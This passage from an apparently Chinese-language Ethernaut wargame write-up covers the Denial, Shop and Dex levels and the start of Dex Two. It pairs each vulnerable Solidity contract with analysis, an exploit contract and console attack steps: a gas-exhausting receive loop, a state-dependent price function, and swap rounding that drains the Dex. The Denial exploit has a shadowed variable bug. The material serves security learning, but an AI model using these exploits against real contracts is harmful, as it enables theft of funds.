<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line">contract Denial &#123;</span><br><span class="line"></span><br><span class="line">    address public partner; // withdrawal partner - pay the gas, split the withdraw</span><br><span class="line">    address public constant owner = address(0xA9E);</span><br><span class="line">    uint timeLastWithdrawn;</span><br><span class="line">    mapping(address =&gt; uint) withdrawPartnerBalances; // keep track of partners balances</span><br><span class="line"></span><br><span class="line">    function setWithdrawPartner(address _partner) public &#123;</span><br><span class="line">        partner = _partner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // withdraw 1% to recipient and 1% to owner</span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        uint amountToSend = address(this).balance / 100;</span><br><span class="line">        // perform a call without checking return</span><br><span class="line">        // The recipient can revert, the owner will still get their share</span><br><span class="line">        partner.call&#123;value:amountToSend&#125;(&quot;&quot;);</span><br><span class="line">        payable(owner).transfer(amountToSend);</span><br><span class="line">        // keep track of last withdrawal time</span><br><span class="line">        timeLastWithdrawn = block.timestamp;</span><br><span class="line">        withdrawPartnerBalances[partner] +=  amountToSend;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // allow deposit of funds</span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    // convenience function</span><br><span class="line">    function contractBalance() public view returns (uint) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract Attack&#123;</span><br><span class="line">  Denial target;</span><br><span class="line">  constructor(address payable  _addr) &#123;</span><br><span class="line">        Denial target = Denial(_addr);</span><br><span class="line">  &#125;</span><br><span class="line">    function hack() public &#123;</span><br><span class="line">        target.setWithdrawPartner(address(this));</span><br><span class="line">    &#125;</span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        while (true) &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="攻击流程-19"><a href="#攻击流程-19" class="headerlink" title="攻击流程"></a>攻击流程</h5><p>获取一个实例,之后查看instance的地址<br><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240326155600888.png" alt="image-20240326155600888"></p>
<p>之后部署攻击合约</p>
<p><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240326162112774.png" alt="image-20240326162112774"></p>
<p>之后点击”Hack”实施攻击即可：</p>
<p>最后提交示例即可</p>
<p><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240326162056343.png" alt="image-20240326162056343"></p>
<h3 id="Shop"><a href="#Shop" class="headerlink" title="Shop"></a>Shop</h3><h5 id="闯关要求-13"><a href="#闯关要求-13" class="headerlink" title="闯关要求"></a>闯关要求</h5><p>您能在商店以低于要求的价格购买到商品吗？</p>
<p> 可能有帮助的注意点：</p>
<ul>
<li>shop合约预计由买家使用</li>
<li>了解view函数的限制</li>
</ul>
<p>也就是price的价格小于100即可</p>
<h5 id="合约代码-21"><a href="#合约代码-21" class="headerlink" title="合约代码"></a>合约代码</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Buyer &#123;</span><br><span class="line">  function price() external view returns (uint);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Shop &#123;</span><br><span class="line">  uint public price = 100;</span><br><span class="line">  bool public isSold;</span><br><span class="line"></span><br><span class="line">  function buy() public &#123;</span><br><span class="line">    Buyer _buyer = Buyer(msg.sender);</span><br><span class="line"></span><br><span class="line">    if (_buyer.price() &gt;= price &amp;&amp; !isSold) &#123;</span><br><span class="line">      isSold = true;</span><br><span class="line">      price = _buyer.price();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="合约分析-21"><a href="#合约分析-21" class="headerlink" title="合约分析"></a>合约分析</h5><p>该<code>buy()</code>函数检查 Buyer 接口返回的价格值是否大于定义的价格 (100) 以及产品是否已售出。如果<code>if</code>报表验证通过， 则<code>isSold</code>设置为<code>true</code>，价格设置为买家界面返回的新价格。</p>
<p>合约定义了一个名为 的接口<code>Buyer</code>，但 buy 函数正在使用 的<code>msg.sender</code>地址来创建实例。这意味着我们可以部署一个攻击者合约，其中包含一个函数，并且在检查价格时<code>price()</code>该函数将调用它。<code>buy()</code></p>
<p>这里应该注意的是，它<code>price()</code>是一个view函数，即它不能改变状态，因此我们不能像在电梯中那样维护状态变量，但我们可以对view函数或pure函数进行外部调用。</p>
<p>因此，要从我们的<code>price()</code>函数返回两个值，我们可以让它根据变量返回值<code>isSold</code>。</p>
<p>并且合约调用了两次<code>price</code>函数，于是我们让这两次返回的数据不一样即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Buyer &#123;</span><br><span class="line">  function price() external view returns (uint);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Shop &#123;</span><br><span class="line">  uint public price = 100;</span><br><span class="line">  bool public isSold;</span><br><span class="line"></span><br><span class="line">  function buy() public &#123;</span><br><span class="line">    Buyer _buyer = Buyer(msg.sender);</span><br><span class="line"></span><br><span class="line">    if (_buyer.price() &gt;= price &amp;&amp; !isSold) &#123;</span><br><span class="line">      isSold = true;</span><br><span class="line">      price = _buyer.price();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract BrokenShop &#123;</span><br><span class="line"></span><br><span class="line">    Shop target = Shop(0xED5b291ACD0816B8AC2B3C2C32f3c5f7C2Af5C63);</span><br><span class="line"></span><br><span class="line">    function exploit() external &#123;</span><br><span class="line">        target.buy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function price () external view returns (uint) &#123;</span><br><span class="line">        return target.isSold() ? 1 : 101;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="攻击流程-20"><a href="#攻击流程-20" class="headerlink" title="攻击流程"></a>攻击流程</h5><p>获取一个实例,之后查看instance的地址<br><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240326164604895.png" alt="image-20240326164604895"></p>
<p>之后部署攻击合约</p>
<p><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240326164750235.png" alt="image-20240326164750235"></p>
<p>之后点击”Hack”实施攻击即可：</p>
<p><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240326164816912.png" alt="image-20240326164816912"></p>
<p>最后提交示例即可</p>
<p><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240326164828930.png" alt="image-20240326164828930"></p>
<h3 id="Dex"><a href="#Dex" class="headerlink" title="Dex"></a>Dex</h3><h5 id="闯关要求-14"><a href="#闯关要求-14" class="headerlink" title="闯关要求"></a>闯关要求</h5><p>此题目的目标是让您破解下面的基本合约并通过价格操纵窃取资金。</p>
<p>一开始您可以得到10个token1和token2。合约以每个代币100个开始。</p>
<p>如果您设法从合约中取出两个代币中的至少一个，并让合约得到一个的“坏”的token价格，您将在此级别上取得成功。</p>
<p>注意： 通常，当您使用ERC20代币进行交换时，您必须approve合约才能为您使用代币。为了与题目的语法保持一致，我们刚刚向合约本身添加了approve方法。因此，请随意使用 contract.approve(contract.address, &lt;uint amount&gt;) 而不是直接调用代币，它会自动批准将两个代币花费所需的金额。 请忽略SwappableToken合约。</p>
<p> 可能有帮助的注意点：</p>
<ul>
<li>代币的价格是如何计算的？</li>
<li>approve方法如何工作？</li>
<li>您如何批准ERC20 的交易？</li>
</ul>
<h5 id="合约代码-22"><a href="#合约代码-22" class="headerlink" title="合约代码"></a>合约代码</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-08/token/ERC20/IERC20.sol&quot;;</span><br><span class="line">import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;;</span><br><span class="line">import &#x27;openzeppelin-contracts-08/access/Ownable.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract Dex is Ownable &#123;</span><br><span class="line">  address public token1;</span><br><span class="line">  address public token2;</span><br><span class="line">  constructor() &#123;&#125;</span><br><span class="line"></span><br><span class="line">  function setTokens(address _token1, address _token2) public onlyOwner &#123;</span><br><span class="line">    token1 = _token1;</span><br><span class="line">    token2 = _token2;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function addLiquidity(address token_address, uint amount) public onlyOwner &#123;</span><br><span class="line">    IERC20(token_address).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function swap(address from, address to, uint amount) public &#123;</span><br><span class="line">    require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), &quot;Invalid tokens&quot;);</span><br><span class="line">    require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;);</span><br><span class="line">    uint swapAmount = getSwapPrice(from, to, amount);</span><br><span class="line">    IERC20(from).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">    IERC20(to).approve(address(this), swapAmount);</span><br><span class="line">    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function getSwapPrice(address from, address to, uint amount) public view returns(uint)&#123;</span><br><span class="line">    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function approve(address spender, uint amount) public &#123;</span><br><span class="line">    SwappableToken(token1).approve(msg.sender, spender, amount);</span><br><span class="line">    SwappableToken(token2).approve(msg.sender, spender, amount);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address token, address account) public view returns (uint)&#123;</span><br><span class="line">    return IERC20(token).balanceOf(account);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SwappableToken is ERC20 &#123;</span><br><span class="line">  address private _dex;</span><br><span class="line">  constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) ERC20(name, symbol) &#123;</span><br><span class="line">        _mint(msg.sender, initialSupply);</span><br><span class="line">        _dex = dexInstance;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function approve(address owner, address spender, uint256 amount) public &#123;</span><br><span class="line">    require(owner != _dex, &quot;InvalidApprover&quot;);</span><br><span class="line">    super._approve(owner, spender, amount);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="合约分析-22"><a href="#合约分析-22" class="headerlink" title="合约分析"></a>合约分析</h5><p>我们将一一介绍每个函数。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function setTokens(address _token1, address _token2) public onlyOwner &#123;</span><br><span class="line">    token1 = _token1;</span><br><span class="line">    token2 = _token2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>用于<code>setTokens()</code>设置每个代币合约的地址。由于修饰符的原因，这只能由owner调用<code>onlyOwner</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function addLiquidity(address token_address, uint amount) public onlyOwner &#123;</span><br><span class="line">    IERC20(token_address).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该<code>addLiquidity()</code>函数也可以仅由owner调用，为合约提供流动性。这会将允许一定数量的代币从代币地址转移到 Dex。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function swap(address from, address to, uint amount) public &#123;</span><br><span class="line">    require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), &quot;Invalid tokens&quot;);</span><br><span class="line">    require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;);</span><br><span class="line">    uint swapAmount = getSwapPrice(from, to, amount);</span><br><span class="line">    IERC20(from).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">    IERC20(to).approve(address(this), swapAmount);</span><br><span class="line">    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>这<code>swap()</code>是一个没有任何修饰符的公共函数，这意味着任何人都可以调用它。这用于将token1 的数量与 token2 的数量进行交换，反之亦然。</li>
<li><code>from</code>和<code>to</code>是token的地址，<code>amount</code>是要交换的数量。</li>
<li>第一个require语句确保地址是owner使用<code>setTokens()</code>函数定义的令牌地址。</li>
<li>另一个 require 语句是检查调用该函数的用户是否拥有足够数量的token。</li>
<li>变量<code>swapAmount</code>为调用<code>getSwapPrice()</code>函数来计算的交换的总量。我们稍后将对此进行更多讨论。</li>
<li><code>transferFrom()</code>进行一个调用，将<code>swapAmount</code>代币从用户转移到 Dex。</li>
<li><code>approve</code>函数用于批准要交换的代币的合同。</li>
<li>然后这些<code>to</code>代币从 Dex 转移到我们的用户。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function getSwapPrice(address from, address to, uint amount) public view returns(uint)&#123;</span><br><span class="line">    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该函数获取代币地址和要交换的代币数量<code>from</code>，并计算代币数量<code>to</code>。使用以下公式 -</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">返还token2数量=（待兑换token1数量*合约token2余额）/合约token1余额。</span><br></pre></td></tr></table></figure>

<p>这是易受攻击的函数。我们将利用 Solidity 中没有浮点数的设置，这意味着每当函数进行除法时，结果都将是一个分数。由于没有小数和浮点数，代币金额将四舍五入为零。因此，通过在 token1 和 token2 之间进行连续的代币交换，我们可以将合约中一种代币的总余额减少到零。精度损失将自动为我们完成这项工作。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function approve(address spender, uint amount) public &#123;</span><br><span class="line">    SwappableToken(token1).approve(msg.sender, spender, amount);</span><br><span class="line">    SwappableToken(token2).approve(msg.sender, spender, amount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>批准是一个 ERC20 函数，用于授予花费者花费<code>amount</code>代币的权限。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function balanceOf(address token, address account) public view returns (uint)&#123;</span><br><span class="line">  return IERC20(token).balanceOf(account);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该<code>balanceOf()</code>函数仅用于计算该地址的剩余代币余额。</p>
<h5 id="利用计算"><a href="#利用计算" class="headerlink" title="利用计算"></a>利用计算</h5><p>为了通过这关，我们必须将所有 token1 交换为 token2。然后将我们所有的 token2 换成 token1。并重复这个过程。让我们看一下token表。</p>
<ol>
<li><p>最初，Dex 的代币余额均为 100，用户的代币余额各为 10。</p>
</li>
<li><p>用户将 10 个代币从 token1 交换到 token2。Dex 将拥有 110 个 token1 和 90 个 token2，而用户将拥有 0 个 token1 和 20 个 token2。</p>
</li>
<li><p>现在，当用户用 20 个 token2 交换 token1 时，公式将返回以下内容 -</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">返回的 token1  = (<span class="number">20</span> * <span class="number">110</span>)/<span class="number">90</span> = <span class="number">24.44</span></span><br></pre></td></tr></table></figure>

<p>该值将四舍五入为 24。这意味着 Dex 现在将拥有 86 个 token1 和 110 个 token2，而我们的用户将拥有 24 个 token1 和 0 个 token2。如果再重复几次，将产生如下所示的值。</p>
</li>
<li><p>我们可以看到，在每次代币交换中，我们留下的代币都比之前持有的要多。</p>
</li>
<li><p>一旦 token1 或 token2 的价值达到 65 个代币，我们就可以进行另一次交换，以耗尽 Dex 中其中一个代币的余额。<code>((65*110)/45 = 158)</code></p>
</li>
</ol>
<table>
<thead>
<tr>
<th><strong>DEX</strong></th>
<th></th>
<th><strong>用户</strong></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td><strong>token1</strong></td>
<td><strong>token2</strong></td>
<td><strong>token1</strong></td>
<td><strong>token2</strong></td>
</tr>
<tr>
<td>100</td>
<td>100</td>
<td>10</td>
<td>10</td>
</tr>
<tr>
<td>110</td>
<td>90</td>
<td>0</td>
<td>20</td>
</tr>
<tr>
<td>86</td>
<td>110</td>
<td>24</td>
<td>0</td>
</tr>
<tr>
<td>110</td>
<td>80</td>
<td>0</td>
<td>30</td>
</tr>
<tr>
<td>69</td>
<td>110</td>
<td>41</td>
<td>0</td>
</tr>
<tr>
<td>110</td>
<td>45</td>
<td>0</td>
<td>65</td>
</tr>
<tr>
<td>0</td>
<td>90</td>
<td>110</td>
<td>20</td>
</tr>
</tbody></table>
<p>这意味着，在最后一步，如果我们需要耗尽 110 个 token1，则需要交换的 token2 数量为<code>(65 * 110)/158 = 45</code>。这将使 Dex 的 token1 余额变为 0。</p>
<p>利用代码如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/access/Ownable.sol&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract Dex is Ownable &#123;</span><br><span class="line">  address public token1;</span><br><span class="line">  address public token2;</span><br><span class="line">  constructor() Ownable(msg.sender) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  function setTokens(address _token1, address _token2) public onlyOwner &#123;</span><br><span class="line">    token1 = _token1;</span><br><span class="line">    token2 = _token2;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function addLiquidity(address token_address, uint amount) public onlyOwner &#123;</span><br><span class="line">    IERC20(token_address).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function swap(address from, address to, uint amount) public &#123;</span><br><span class="line">    require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), &quot;Invalid tokens&quot;);</span><br><span class="line">    require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;);</span><br><span class="line">    uint swapAmount = getSwapPrice(from, to, amount);</span><br><span class="line">    IERC20(from).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">    IERC20(to).approve(address(this), swapAmount);</span><br><span class="line">    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function getSwapPrice(address from, address to, uint amount) public view returns(uint)&#123;</span><br><span class="line">    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function approve(address spender, uint amount) public &#123;</span><br><span class="line">    SwappableToken(token1).approve(msg.sender, spender, amount);</span><br><span class="line">    SwappableToken(token2).approve(msg.sender, spender, amount);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address token, address account) public view returns (uint)&#123;</span><br><span class="line">    return IERC20(token).balanceOf(account);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SwappableToken is ERC20 &#123;</span><br><span class="line">  address private _dex;</span><br><span class="line">  constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) ERC20(name, symbol) &#123;</span><br><span class="line">        _mint(msg.sender, initialSupply);</span><br><span class="line">        _dex = dexInstance;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function approve(address owner, address spender, uint256 amount) public &#123;</span><br><span class="line">    require(owner != _dex, &quot;InvalidApprover&quot;);</span><br><span class="line">    super._approve(owner, spender, amount);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract POC  &#123;</span><br><span class="line">    Dex target ;</span><br><span class="line">    constructor(address _addr) &#123;</span><br><span class="line">      target = Dex(_addr);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    function run() external&#123;</span><br><span class="line">        target.approve(address(target), 500);</span><br><span class="line">        address token1 = target.token1();</span><br><span class="line">        address token2 = target.token2();</span><br><span class="line">        target.swap(token1, token2, 10);</span><br><span class="line">        target.swap(token2, token1, 20);</span><br><span class="line">        target.swap(token1, token2, 24);</span><br><span class="line">        target.swap(token2, token1, 30);</span><br><span class="line">        target.swap(token1, token2, 41);</span><br><span class="line">        target.swap(token2, token1, 45);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码逻辑上没问题，但由于我们合约上没有这个token，于是是不能执行成功的，我们需要在控制台进行控制，逻辑上是一样的</p>
<h5 id="攻击流程-21"><a href="#攻击流程-21" class="headerlink" title="攻击流程"></a>攻击流程</h5><p>获取一个实例,之后查看instance的地址<br><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240326185336026.png" alt="image-20240326185336026"></p>
<p>之后执行和合约一样的效果的js代码</p>
<p><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240326193458690.png" alt="image-20240326193458690"></p>
<p>​       <code> target.swap(token1, token2, 10);</code></p>
<p><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240326193519487.png" alt="image-20240326193519487"></p>
<p>​    <code>target.swap(token2, token1, 20);</code></p>
<p><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240326193653296.png" alt="image-20240326193653296">    	<code>target.swap(token1, token2, 24);</code></p>
<p><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240326193716462.png" alt="image-20240326193716462"></p>
<p>​    <code>target.swap(token2, token1, 30);</code></p>
<p><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240326193745761.png" alt="image-20240326193745761"></p>
<p>​    <code>target.swap(token1, token2, 41);</code></p>
<p><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240326193801902.png" alt="image-20240326193801902"></p>
<p>​    <code>target.swap(token2, token1, 45);</code></p>
<p><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240326193817882.png" alt="image-20240326193817882"></p>
<p>最后提交示例即可</p>
<p><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240326193927149.png" alt="image-20240326193927149"></p>
<h3 id="Dex-Two"><a href="#Dex-Two" class="headerlink" title="Dex Two"></a>Dex Two</h3><h5 id="闯关要求-15"><a href="#闯关要求-15" class="headerlink" title="闯关要求"></a>闯关要求</h5><p>此级别将要求您以不同的方式破坏DexTwo，这是对前一题目进行了细微修改的Dex合约。</p>
<p>您需要从DexTwo合约中提取token1和token2的所有余额才能通过此题。</p>
